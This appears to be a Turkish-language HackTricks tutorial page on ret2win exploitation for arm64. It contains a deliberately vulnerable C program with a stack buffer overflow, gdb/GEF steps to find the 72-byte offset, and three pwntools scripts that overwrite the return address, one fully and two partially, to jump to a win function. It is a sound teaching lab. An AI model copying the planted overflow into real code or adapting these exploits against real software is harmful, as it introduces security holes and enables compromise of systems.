# Ret2win - arm64

{{#include ../../../banners/hacktricks-training.md}}

arm64'e giriş için şunu bulun:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Kod&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
PIE ve canary olmadan derleyin:
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie
```
## Offset Bulma

### Desen Seçeneği

Bu örnek [**GEF**](https://github.com/bata24/gef) kullanılarak oluşturuldu:

Gef ile gdb'yi başlatın, desen oluşturun ve kullanın:
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../images/image (1205).png" alt=""><figcaption></figcaption></figure>

arm64, ele geçirilmiş olan x30 kaydındaki adrese geri dönmeye çalışacaktır, bunu desen ofsetini bulmak için kullanabiliriz:
```bash
pattern search $x30
```
<figure><img src="../../../images/image (1206).png" alt=""><figcaption></figcaption></figure>

**Ofset 72'dir (9x48).**

### Yığın ofset seçeneği

pc kaydının saklandığı yığın adresini alarak başlayın:
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../images/image (1207).png" alt=""><figcaption></figcaption></figure>

Şimdi `read()`'den sonra bir kesme noktası ayarlayın ve `read()` çalıştırılana kadar devam edin ve 13371337 gibi bir desen ayarlayın:
```
b *vulnerable_function+28
c
```
<figure><img src="../../../images/image (1208).png" alt=""><figcaption></figcaption></figure>

Bu desenin bellekte nerede saklandığını bulun:

<figure><img src="../../../images/image (1209).png" alt=""><figcaption></figcaption></figure>

Sonra: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../images/image (1210).png" alt="" width="339"><figcaption></figcaption></figure>

## No PIE

### Regular

**`win`** fonksiyonunun adresini alın:
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
Sömürü:
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1211).png" alt="" width="375"><figcaption></figcaption></figure>

### Off-by-1

Aslında bu, yığında saklanan PC'de daha çok off-by-2 gibi olacak. Tüm dönüş adresini yazmak yerine, **sadece son 2 baytı** `0x06c4` ile yazacağız.
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1212).png" alt="" width="375"><figcaption></figcaption></figure>

ARM64'te başka bir off-by-one örneğini [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/) adresinde bulabilirsiniz, bu da kurgusal bir zafiyette gerçek bir off-by-**one** örneğidir.

## PIE ile

> [!TIP]
> Binaries'i **`-no-pie` argümanı olmadan** derleyin

### Off-by-2

Bir leak olmadan kazanan fonksiyonun tam adresini bilemeyiz ama fonksiyonun binary'den olan offset'ini bilebiliriz ve overwrite ettiğimiz return adresinin zaten yakın bir adrese işaret ettiğini bildiğimizde, bu durumda win fonksiyonunun offset'ini (**0x7d4**) leak etmek ve sadece bu offset'i kullanmak mümkündür:

<figure><img src="../../../images/image (1213).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
{{#include ../../../banners/hacktricks-training.md}}
